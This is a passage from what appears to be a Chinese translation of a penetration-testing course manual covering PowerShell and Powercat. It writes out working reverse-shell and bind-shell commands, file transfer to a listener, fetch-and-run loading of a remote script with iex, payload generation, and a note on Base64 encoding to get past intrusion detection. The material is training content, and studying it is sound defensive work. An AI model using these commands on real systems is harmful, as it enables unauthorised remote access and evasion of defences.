

S ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush();
$client.Close();
$listener.Stop()
```

![](img/ec25e59d75726b7041242a56d3376832_90_0.png)

在绑定 Shell 监听建立后，我们可以像使用任何其他 Shell 一样，使用 Netcat 从 Alice 的机器连接到它。我们为 Netcat 包含 `-w` 选项，因为我们的绑定 Shell 在首次连接时并不总是向我们显示命令提示符：

```
kali@kali:~$ nc -nv 10.11.0.22 443
(UNKNOWN) [10.11.0.22] 443 (https) open
ipconfig

Windows IP Configuration

Ethernet adapter Local Area Connection:
    Connection-specific DNS Suffix . . :
    IPv4 Address. . . . . . . . . . . : 10.11.0.22
    Subnet Mask . . . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . . : 10.11.0.1

C:\Users>
offsec>
```

![](img/ec25e59d75726b7041242a56d3376832_90_1.png)

PowerShell 功能极其强大，我们甚至还没有触及它功能的皮毛。由于微软日益增加使用 PowerShell 进行基于 Windows 的管理和自动化，知道如何正确使用 PowerShell 来实现我们的目标至关重要。更多类和方法，以及在线提供的各种 PowerShell 培训和演讲，请参阅 Microsoft PowerShell 文档<sup>95</sup> 和 Microsoft System.Net 参考。

### 4.3.4 Powercat

Powercat<sup>96</sup> 本质上是 besimorhino<sup>97</sup> 编写的 Netcat 的 PowerShell 版本。这是一个我们可以下载到 Windows 主机上的脚本，利用 PowerShell 的优势，简化绑定/反向 Shell 的创建。

> Powercat 可以通过 `apt install powercat` 安装在 Kali 中，这会将脚本放置在 `/usr/share/windows-resources/powercat`

我们可以跳过第一步，即从我们的 Kali Linux 机器将脚本传输到 Windows 主机，因为我们已经熟悉文件传输。

在目标主机上有该脚本后，我们首先使用一种称为 Dot-sourcing<sup>98</sup> 的 PowerShell 功能来加载 `powercat.ps1` 脚本。这将使脚本中声明的所有变量和函数在当前 PowerShell 作用域中可用。通过这种方式，我们可以在 PowerShell 中直接使用 `powercat` 函数，而不是每次都执行脚本。

```
PS C:\Users\Offsec> . \.\powercat.ps1
```
*列表 109 - 使用点源加载本地 PowerShell 脚本*

如果目标机器连接到互联网，我们可以通过再次使用便捷的 `iex` cmdlet 对远程脚本执行相同的操作，如下所示：

```
PS C:\Users\Offsec> iex (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```
*列表 110 - 使用 iex 加载远程 PowerShell 脚本*

值得注意的是，以这种方式加载的脚本仅在当前的 PowerShell 实例中可用，每次重启 PowerShell 时都需要重新加载。

现在我们的脚本已加载，我们可以按如下方式执行 `powercat`：

```
PS C:\Users\Offsec> powercat
You must select either client mode (-c) or listen mode (-l).
```
*列表 111 - 在 PowerShell 中直接执行 powercat 函数*

我们可以通过查看帮助菜单快速熟悉 Powercat：

```
PS C:\Users\Offsec> powercat -h
powercat - Netcat, The PowerShell Version
Github Repository: https://github.com/besimorhino/powercat
```

该脚本尝试在 powershell 脚本中实现 netcat 的功能。它还包含一些额外功能，例如内置中继、执行 powershell，以及 dnscat2 客户端。

Usage: powercat [-c or -l] [-p port] [options]

- `-c <ip>`: 客户端模式。提供您希望连接的系统 IP。如果使用 -dns，请指定发送查询的 DNS 服务器。
- `-l`: 监听模式。在 -p 指定的端口上启动监听器。
- `-p <port>`: 端口。要连接的端口，或要监听的端口。
- `-e <proc>`: 执行。指定要启动的进程名称。
- `-i <input>`: 输入。在建立连接后立即提供要沿管道发送的数据。用于传输文件。您可以提供文件路径、字节数组对象或字符串。您也可以将这些内容中的任何一个管道传入 powercat，例如 'aaaaa' | powercat -c 10.1.1.1 -p 80
- `-g`: 生成载荷。返回一个字符串形式的脚本，该脚本将使用您指定的选项执行 powercat。-i、-d 和 -rep 将被整合其中。
- `-ge`: 生成编码载荷。与 -g 相同，但返回一个字符串，可以通过以下方式执行：powershell -E <编码字符串>

```
-h              Print this help message.
...
```
*列表 112 - Powercat 帮助菜单*

让我们回顾一下如何使用 powercat 进行文件传输以及绑定和反向 Shell，就像我们之前使用其他工具所做的那样。

### 4.3.5 Powercat 文件传输

虽然我们可以使用任何之前讨论过的工具将 Powercat 传输到我们的目标，但让我们看看如何使用 powercat 将自身（**powercat.ps1**）从 Bob 传输到 Alice，以此作为演示 powercat 文件传输的一种方式。

首先，我们在 Alice 的计算机上运行一个 Netcat 监听器：

```
kali@kali:~$ sudo nc -lvp 443 > receiving_powercat.ps1
listening on [any] 443 ...
connect  to [10.11.0.4]  from (UNKNOWN) [10.11.0.22] 63661
```
*列表 113 - 使用 nc 为 powercat 文件传输设置监听器*

接下来，我们将在 Bob 的计算机上调用 **powercat**。-c 选项指定客户端模式并设置监听 IP 地址，-p 指定要连接的端口号，-i 指示将被远程传输的本地文件：

```
PS C:\Users\Offsec> powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
```
*列表 114 - 使用 powercat 发送文件*

最后，Alice 将终止 Netcat 进程并检查文件是否已接收：

```
^C
kali@kali:~$ ls receiving_powercat.ps1
receiving_powercat.ps1
```
*列表 115 - 验证通过 powercat 发送的文件接收*

### 4.3.6 Powercat 反向 Shell

反向 Shell 的过程与我们之前看到的类似。我们将在 Alice 的计算机上启动一个 Netcat 监听器，然后 Bob 将使用 **powercat** 发送反向 Shell。

我们从 Alice 机器上的 Netcat 监听器开始：

```
kali@kali:~$ sudo nc -lvp 443
listening on [any] 443 ...
```
*列表 116 - 使用 nc 设置监听器以接收来自 powercat 的反向 Shell*

接下来，Bob 将使用 **powercat** 发送反向 Shell。在此示例中，-e 选项指定在连接到监听端口后要执行的应用程序（cmd.exe）：

```
PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe
```
*列表 117 - 使用 powercat 发送反向 Shell*

最后，Alice 的 Netcat 监听器将接收 Shell：

```
connect  to [10.11.0.4]  from (UNKNOWN) [10.11.0.22] 63699
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\offsec>
```
*列表 118 - 接收 powercat 反向 Shell*

### 4.3.7 Powercat 绑定 Shell

相比之下，powercat 绑定 Shell 是在 Bob 的一侧通过 **powercat** 监听器启动的。我们将使用 **-l** 选项创建监听器，**-p** 指定监听端口号，**-e** 指定连接后要执行的应用程序（**cmd.exe**）：

```
PS C:\Users\offsec> powercat -l -p 443 -e cmd.exe
```
*列表 119 - 使用 powercat 设置绑定 Shell*

接下来，Alice 将在 Bob 的计算机上创建连接到绑定 Shell 的 Netcat 连接：

```
kali@kali:~$ nc 10.11.0.22 443
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\offsec>
```
*列表 120 - 使用 nc 连接到由 powercat 创建的绑定 Shell*

### 4.3.8 Powercat 独立载荷

Powercat 还可以生成独立载荷。<sup>99</sup> 在 powercat 的上下文中，载荷是一组 powershell 指令，以及 powercat 脚本本身仅包含用户请求的功能的部分。让我们在下一个示例中尝试使用载荷。

在 Alice 机器上启动监听器后，我们在之前的 **powercat** 命令中添加 **-g** 选项并创建一个独立的反向 Shell 载荷，并将输出重定向到文件。这将生成一个 powershell 脚本，Bob 可以在他的机器上执行：

```
PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
PS C:\Users\offsec> ./reverseshell.ps1
```
*列表 121 - 创建并执行独立载荷*

值得注意的是，像这样的独立载荷可能很容易被 IDS 检测到。具体来说，生成的脚本相当大，大约有 300 行代码。此外，它还包含一些硬编码字符串，这些字符串可以很容易地用于创建恶意活动签名。虽然任何特定签名的识别超出了本模块的范围，但足以说，像这样的明文恶意代码很可能成功率较低，并很可能被防御性软件解决方案捕获。

我们可以尝试通过利用 PowerShell 执行 Base64 编码命令的能力来克服这个问题。要生成一个独立的编码载荷，我们使用 **-ge** 选项，并再次将输出重定向到文件：

---
<sup>95</sup> (Microsoft, 2019), https://docs.microsoft.com/en-us/powershell/
<sup>96</sup> (besimorhino/powercat, 2017), https://github.com/besimorhino/powercat/blob/master/powercat.ps1
<sup>97</sup> (besimorhino, 2018), https://github.com/besimorhino
<sup>98</sup> (SS64, 2019), https://ss64.com/ps/source.html
<sup>99</sup> (Wikipedia, 2019), https://en.wikipedia.org/wiki/Payload_(computing)

